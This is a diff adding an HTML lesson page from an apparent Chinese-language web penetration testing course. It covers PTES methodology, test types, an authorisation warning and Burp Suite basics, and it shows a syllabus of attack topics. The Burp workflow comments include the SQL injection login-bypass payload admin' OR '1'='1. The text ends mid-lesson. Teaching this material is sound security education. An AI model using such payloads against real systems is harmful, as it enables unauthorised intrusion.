@@ -1,0 +1,1679 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stage 04 — Web 滲透測試 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#080b0f;--bg2:#0c0f14;--bg3:#111520;--sur:#181d28;--bdr:#1e2535;
+  --acc:#ff4d6d;--acc2:#ff8c42;--txt:#e4ddf5;--txt2:#8b879e;--txt3:#454155;
+  --grn:#3ecf8e;--org:#f97316;--red:#f05252;--ylw:#fbbf24;--pur:#a78bfa;--cyn:#22d3ee;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse 60% 40% at 15% 0%,rgba(255,77,109,.05) 0%,transparent 55%),
+  radial-gradient(ellipse 50% 35% at 85% 100%,rgba(255,140,66,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(8,11,15,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(255,77,109,.12);color:var(--acc);border:1px solid rgba(255,77,109,.3);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:22px 22px 16px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:13px;}
+.sb-meta{display:flex;gap:16px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:6px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 22px;background:none;border:none;border-bottom:1px solid rgba(30,37,53,.7);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.79rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.15);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:7px 22px 7px 44px;background:none;border:none;border-bottom:1px solid rgba(30,37,53,.4);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.74rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(255,77,109,.03);}
+.ls-btn.lact{color:var(--acc);background:rgba(255,77,109,.06);}
+.ls-btn.ldone{color:var(--txt3);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot{background:var(--acc);}
+.ls-btn.ldone .ls-dot{background:var(--grn);}
+.sb-f{padding:13px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:6px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:38px 56px 30px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(255,77,109,.04) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:11px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.6rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:11px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.67rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(255,77,109,.4);color:var(--acc);}
+.cw{padding:38px 56px 80px;max-width:880px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .25s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+h2{font-size:1.25rem;font-weight:800;letter-spacing:-.01em;margin:36px 0 13px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:.98rem;font-weight:700;margin:22px 0 9px;color:var(--txt);}
+p{font-size:.9rem;line-height:1.85;color:var(--txt2);margin-bottom:11px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:13px 17px;margin:18px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:6px;}
+.note p{margin:0;font-size:.86rem;line-height:1.7;}
+.note.tip{border-color:var(--cyn);background:rgba(34,211,238,.06);}
+.note.tip .note-lbl{color:var(--cyn);}
+.note.warn{border-color:var(--org);background:rgba(249,115,22,.07);}
+.note.warn .note-lbl{color:var(--org);}
+.note.sec{border-color:var(--grn);background:rgba(62,207,142,.07);}
+.note.sec .note-lbl{color:var(--grn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.law{border-color:var(--pur);background:rgba(167,139,250,.07);}
+.note.law .note-lbl{color:var(--pur);}
+.note.atk{border-color:var(--acc);background:rgba(255,77,109,.07);}
+.note.atk .note-lbl{color:var(--acc);}
+.cblock{background:#060810;border:1px solid var(--bdr);border-radius:6px;margin:16px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:7px 15px;background:rgba(20,25,38,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:16px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.75;color:#cdd9f5;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#3d495e;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .tg{color:#f07178;}pre .at{color:#ffcb6b;}pre .vl{color:#c3e88d;}
+pre .sl{color:#89ddff;}pre .vr{color:#eeffff;}pre .op{color:#89ddff;}pre .hl{background:rgba(255,77,109,.12);border-radius:2px;padding:0 2px;}
+.tbl{overflow-x:auto;margin:16px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.82rem;}
+table.t th{background:var(--sur);padding:9px 14px;text-align:left;font-size:.63rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:9px 14px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.mc{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--acc);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.kt{background:var(--bg2);padding:14px 17px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:16px 0;}
+.il-item{display:flex;align-items:flex-start;gap:13px;padding:12px 17px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.85rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.flowchart{display:flex;align-items:center;gap:0;margin:18px 0;flex-wrap:wrap;row-gap:8px;}
+.flow-step{background:var(--sur);border:1px solid var(--bdr);border-radius:4px;padding:8px 14px;font-size:.76rem;text-align:center;flex-shrink:0;}
+.flow-step .fs-n{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;margin-bottom:3px;}
+.flow-step .fs-t{color:var(--txt);font-weight:600;}
+.flow-arr{color:var(--txt3);padding:0 8px;font-size:.8rem;flex-shrink:0;}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:22px;margin:26px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px;}
+.q-q{font-size:.9rem;font-weight:600;margin-bottom:13px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:6px;}
+.qo{display:flex;align-items:flex-start;gap:10px;padding:8px 13px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.83rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--grn);background:rgba(62,207,142,.07);color:var(--grn);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);min-width:16px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:12px;padding:11px 14px;background:rgba(255,77,109,.06);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.82rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.atkflow{display:flex;flex-direction:column;gap:3px;margin:18px 0;}
+.af-step{display:flex;align-items:flex-start;gap:13px;padding:13px 16px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;position:relative;}
+.af-step::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--bdr);border-radius:4px 0 0 4px;}
+.af-step.s1::before{background:var(--cyn);}
+.af-step.s2::before{background:var(--ylw);}
+.af-step.s3::before{background:var(--org);}
+.af-step.s4::before{background:var(--acc);}
+.af-step.s5::before{background:var(--red);}
+.af-step.s6::before{background:var(--pur);}
+.af-n{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);font-weight:700;min-width:40px;flex-shrink:0;padding-top:2px;letter-spacing:.04em;}
+.af-t{font-size:.82rem;font-weight:700;color:var(--txt);margin-bottom:4px;}
+.af-d{font-size:.78rem;color:var(--txt2);line-height:1.55;font-weight:300;}
+.done-banner{background:linear-gradient(135deg,rgba(255,77,109,.08),rgba(255,140,66,.06));border:1px solid rgba(255,77,109,.2);border-radius:6px;padding:28px;margin:34px 0 14px;text-align:center;}
+.done-banner h3{font-size:1.1rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.87rem;margin-bottom:20px;}
+.btn-row{display:flex;gap:11px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:10px 24px;background:var(--acc);color:var(--bg);text-decoration:none;font-weight:700;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#ff7090;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:10px 24px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:22px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:8px 18px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.82rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pri{background:var(--acc);color:var(--bg);border-color:var(--acc);font-weight:700;}
+.lb.pri:hover:not(:disabled){background:#ff7090;}
+.lb:disabled{opacity:.2;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);}
+.ln-sub{font-size:.75rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+.tool-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.tool-card{background:var(--bg2);padding:14px 16px;}
+.tc-name{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.tc-cat{display:inline-block;font-size:.58rem;color:var(--txt3);border:1px solid var(--bdr);padding:1px 7px;border-radius:2px;font-family:'JetBrains Mono',monospace;margin-bottom:7px;letter-spacing:.04em;}
+.tc-d{font-size:.77rem;color:var(--txt2);line-height:1.55;font-weight:300;}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:20px;padding-right:20px;}.lnav{padding:16px 20px;}.kg,.tool-grid{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 04</span><span class="n-sname">Web 滲透測試核心（2個月）</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 04 · 2個月 · 核心</div>
+    <div class="sb-title">Web 滲透測試<br>全套技術體系</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">10</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">32</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">2月</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav" id="sbnav">
+    <!-- CH1 -->
+    <div><button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')"><span class="ch-num">CH1</span><span class="ch-name">滲透測試方法論與工具</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list lopen" id="ch1">
+      <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>滲透測試方法論（PTES / OWASP）</button>
+      <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>Burp Suite 完整使用指南</button>
+      <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>情報收集：資產發現與子域名枚舉</button>
+      <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>指紋識別與漏洞掃描</button>
+    </div></div>
+    <!-- CH2 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch2')"><span class="ch-num">CH2</span><span class="ch-name">SQL 注入攻防</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch2">
+      <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>SQL 注入原理與手工注入</button>
+      <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>聯合查詢注入 / 報錯注入</button>
+      <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>布林盲注 / 時間盲注</button>
+      <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>sqlmap 自動化利用與繞過技巧</button>
+    </div></div>
+    <!-- CH3 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch3')"><span class="ch-num">CH3</span><span class="ch-name">XSS 跨站腳本攻擊</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch3">
+      <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>XSS 三大類型與利用原理</button>
+      <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>XSS 過濾繞過技巧</button>
+      <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>BeEF 框架：瀏覽器控制攻擊</button>
+    </div></div>
+    <!-- CH4 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch4')"><span class="ch-num">CH4</span><span class="ch-name">文件上傳 & 文件包含</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch4">
+      <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>文件上傳漏洞全面剖析</button>
+      <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>文件上傳繞過技巧（黑白名單）</button>
+      <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>文件包含漏洞（LFI / RFI）</button>
+    </div></div>
+    <!-- CH5 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch5')"><span class="ch-num">CH5</span><span class="ch-name">SSRF / XXE / 反序列化</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch5">
+      <button class="ls-btn" onclick="go('l5-1',this)"><span class="ls-dot"></span>SSRF 伺服器端請求偽造</button>
+      <button class="ls-btn" onclick="go('l5-2',this)"><span class="ls-dot"></span>XXE XML 外部實體注入</button>
+      <button class="ls-btn" onclick="go('l5-3',this)"><span class="ls-dot"></span>反序列化漏洞原理與利用</button>
+    </div></div>
+    <!-- CH6 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch6')"><span class="ch-num">CH6</span><span class="ch-name">CSRF / 邏輯漏洞 / 越權</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch6">
+      <button class="ls-btn" onclick="go('l6-1',this)"><span class="ls-dot"></span>CSRF 跨站請求偽造</button>
+      <button class="ls-btn" onclick="go('l6-2',this)"><span class="ls-dot"></span>業務邏輯漏洞（支付 / 驗證碼 / 密碼重置）</button>
+      <button class="ls-btn" onclick="go('l6-3',this)"><span class="ls-dot"></span>越權漏洞（水平 / 垂直）</button>
+    </div></div>
+    <!-- CH7 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch7')"><span class="ch-num">CH7</span><span class="ch-name">命令注入 & 代碼執行</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch7">
+      <button class="ls-btn" onclick="go('l7-1',this)"><span class="ls-dot"></span>OS 命令注入（RCE）</button>
+      <button class="ls-btn" onclick="go('l7-2',this)"><span class="ls-dot"></span>常見框架 RCE 漏洞（Shiro / Log4j）</button>
+      <button class="ls-btn" onclick="go('l7-3',this)"><span class="ls-dot"></span>Webshell 管理：蟻劍 / 冰蠍 / 哥斯拉</button>
+    </div></div>
+    <!-- CH8 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch8')"><span class="ch-num">CH8</span><span class="ch-name">Metasploit & 後滲透</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch8">
+      <button class="ls-btn" onclick="go('l8-1',this)"><span class="ls-dot"></span>Metasploit Framework 全面入門</button>
+      <button class="ls-btn" onclick="go('l8-2',this)"><span class="ls-dot"></span>Meterpreter 後滲透操作</button>
+      <button class="ls-btn" onclick="go('l8-3',this)"><span class="ls-dot"></span>提權技術（Linux / Windows）</button>
+      <button class="ls-btn" onclick="go('l8-4',this)"><span class="ls-dot"></span>內網橫向移動與持久化</button>
+    </div></div>
+    <!-- CH9 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch9')"><span class="ch-num">CH9</span><span class="ch-name">WAF 繞過與防禦</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch9">
+      <button class="ls-btn" onclick="go('l9-1',this)"><span class="ls-dot"></span>WAF 識別與常用繞過技術</button>
+      <button class="ls-btn" onclick="go('l9-2',this)"><span class="ls-dot"></span>Nginx / Apache 安全加固</button>
+    </div></div>
+    <!-- CH10 -->
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch10')"><span class="ch-num">CH10</span><span class="ch-name">源碼審計 & 綜合靶機</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch10">
+      <button class="ls-btn" onclick="go('l10-1',this)"><span class="ls-dot"></span>PHP 源碼審計方法與實戰</button>
+      <button class="ls-btn" onclick="go('l10-2',this)"><span class="ls-dot"></span>靶機通關：DC 系列 / HackTheBox</button>
+      <button class="ls-btn" onclick="go('l10-3',this)"><span class="ls-dot"></span>滲透測試報告撰寫規範</button>
+    </div></div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 04 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">滲透測試方法論</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">方法論</span>
+      <span class="chip" id="chip2">20 分鐘</span>
+    </div>
+  </div>
+  <div class="cw">
+
+<!-- ===== L1-1 方法論 ===== -->
+<div class="cb on" id="l1-1">
+<h2>滲透測試方法論</h2>
+<p>滲透測試不是隨意使用工具掃一遍，而是有系統性的流程。主流的方法論框架為每個階段提供清晰指引，確保測試全面且可重現。</p>
+
+<h3>PTES（滲透測試執行標準）</h3>
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">01</span><div><div class="af-t">前期溝通（Pre-engagement）</div><div class="af-d">與客戶確認測試範圍（IP/域名/功能模塊）、時間窗口、測試類型（黑盒/白盒/灰盒）、緊急聯繫人、法律文件（SOW/NDA）簽署</div></div></div>
+  <div class="af-step s2"><span class="af-n">02</span><div><div class="af-t">情報收集（Intelligence Gathering）</div><div class="af-d">被動偵察（WHOIS、Google Hacking、LinkedIn、Shodan）和主動偵察（端口掃描、子域名枚舉、目錄掃描），目標：<strong>畫出完整的攻擊面地圖</strong></div></div></div>
+  <div class="af-step s3"><span class="af-n">03</span><div><div class="af-t">威脅建模（Threat Modeling）</div><div class="af-d">根據收集的信息，分析最可能的攻擊入口和高價值目標，制定詳細的測試計劃和優先順序</div></div></div>
+  <div class="af-step s4"><span class="af-n">04</span><div><div class="af-t">漏洞分析（Vulnerability Analysis）</div><div class="af-d">使用掃描工具（Nessus/Nikto/Nuclei）和手工測試發現漏洞，驗證誤報，評估漏洞的實際影響</div></div></div>
+  <div class="af-step s4"><span class="af-n">05</span><div><div class="af-t">漏洞利用（Exploitation）</div><div class="af-d">使用工具或手工方式利用已確認的漏洞，獲取 Shell 或敏感數據，<strong>核心原則：保留充分證據截圖</strong></div></div></div>
+  <div class="af-step s5"><span class="af-n">06</span><div><div class="af-t">後滲透（Post-Exploitation）</div><div class="af-d">在授權範圍內進行提權、橫向移動、持久化，演示漏洞的最大業務影響（如能否接觸到客戶隱私數據、財務系統等）</div></div></div>
+  <div class="af-step s6"><span class="af-n">07</span><div><div class="af-t">報告撰寫（Reporting）</div><div class="af-d">撰寫清晰、可操作的測試報告。分管理摘要（給高管看）和技術細節（給開發/運維看），包含每個漏洞的風險評級、复現步驟、修復建議</div></div></div>
+</div>
+
+<h3>測試類型</h3>
+<div class="kg">
+  <div class="kt"><div class="kt-n">黑盒測試 Black-box</div><div class="kt-d">測試者對目標系統一無所知，完全模擬外部攻擊者視角。最接近真實攻擊場景，但耗時最長、覆蓋面可能不全面。</div></div>
+  <div class="kt"><div class="kt-n">白盒測試 White-box</div><div class="kt-d">測試者獲得完整的系統信息（架構圖、源碼、帳號）。覆蓋最全面，效率最高，常用於安全開發生命週期（SDLC）中的代碼審計。</div></div>
+  <div class="kt"><div class="kt-n">灰盒測試 Grey-box</div><div class="kt-d">介於兩者之間。測試者獲得部分信息（如低權限帳號、API 文檔）。是實際項目中最常見的模式，平衡了效率和真實性。</div></div>
+  <div class="kt"><div class="kt-n">紅隊演練 Red Team</div><div class="kt-d">長時間（數週至數月）、全面的模擬 APT 攻擊，包含社工釣魚、物理入侵等。目標是測試組織整體防禦和應急能力，而非找出所有漏洞。</div></div>
+</div>
+
+<div class="note law">
+  <div class="note-lbl">永遠記住</div>
+  <p>無論多麼高超的技術，<strong>沒有書面授權協議，任何滲透測試都是犯罪</strong>。Stage 4 學習的所有技術，只能在以下場景使用：<br>① 您自己搭建的靶機（Vulhub/DVWA/HTB）<br>② 已取得 SOW 授權的委託項目<br>③ 官方 SRC / BUG BOUNTY 平台的授權範圍</p>
+</div>
+</div>
+
+<!-- ===== L1-2 Burp Suite ===== -->
+<div class="cb" id="l1-2">
+<h2>Burp Suite：Web 滲透測試瑞士軍刀</h2>
+<p>Burp Suite 是 Web 滲透測試中最重要的工具，沒有之一。幾乎所有 Web 漏洞的測試都需要用到它。必須達到熟練操作的水準。</p>
+
+<h3>核心模組一覽</h3>
+<div class="tool-grid">
+  <div class="tool-card"><div class="tc-name">Proxy（代理）</div><div class="tc-cat">核心模組</div><div class="tc-d">攔截和修改瀏覽器與服務器之間的所有 HTTP/HTTPS 請求。所有 Web 漏洞測試的起點，必須掌握。</div></div>
+  <div class="tool-card"><div class="tc-name">Repeater（重發器）</div><div class="tc-cat">核心模組</div><div class="tc-d">手動修改並重複發送 HTTP 請求，觀察不同輸入對響應的影響。手工測試 SQL 注入、XSS、越權的主要工具。</div></div>
+  <div class="tool-card"><div class="tc-name">Intruder（爆破器）</div><div class="tc-cat">核心模組</div><div class="tc-d">自動化的 Payload 投放工具，可進行暴力破解、參數枚舉、模糊測試。注意：Community 版限速，建議用 ffuf 替代。</div></div>
+  <div class="tool-card"><div class="tc-name">Scanner（掃描）</div><div class="tc-cat">Pro 版功能</div><div class="tc-d">自動掃描 Web 漏洞，Pro 版功能強大，可發現 SQLi、XSS 等常見漏洞。Community 版不含此模組。</div></div>
+  <div class="tool-card"><div class="tc-name">Decoder（解碼）</div><div class="tc-cat">輔助工具</div><div class="tc-d">快速進行 URL 編碼/解碼、Base64、HTML 實體、十六進制等各種編碼轉換。WAF 繞過時常用。</div></div>
+  <div class="tool-card"><div class="tc-name">Logger（日誌）</div><div class="tc-cat">輔助工具</div><div class="tc-d">記錄所有 HTTP 流量，可搜尋和過濾。做測試報告時用於回溯每個請求的細節。</div></div>
+</div>
+
+<h3>Burp Suite 核心工作流</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">Burp Suite — 環境配置與使用流程</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># 1. 啟動 Burp Suite（Kali 已預裝）</span>
+burpsuite
+
+<span class="cm"># 2. 設置瀏覽器代理（Proxy → Options → Proxy Listeners → 127.0.0.1:8080）</span>
+<span class="cm"># 推薦使用 Firefox + FoxyProxy 插件快速切換代理</span>
+
+<span class="cm"># 3. 安裝 Burp CA 憑證（用於 HTTPS 流量解密）</span>
+<span class="cm"># 訪問 http://burpsuite 下載憑證 → Firefox 中匯入到 "Certificate Authorities"</span>
+
+<span class="cm"># ─── 典型操作流程 ───</span>
+<span class="cm"># 1. 在登入頁面輸入帳密 → Burp Proxy 攔截請求</span>
+<span class="cm"># 2. 右鍵 "Send to Repeater"</span>
+<span class="cm"># 3. 在 Repeater 中修改 username 參數：admin' OR '1'='1</span>
+<span class="cm"># 4. 觀察響應：200 OK + 跳轉到儀表板 = SQL 注入確認</span>
+<span class="cm"># 5. 右鍵 "Send to Intruder" 進行進一步枚舉</span>
+
+<span class="cm"># ─── 常用快捷鍵 ───</span>
+<span class="cm"># Ctrl+R  →  Send to Repeater</span>
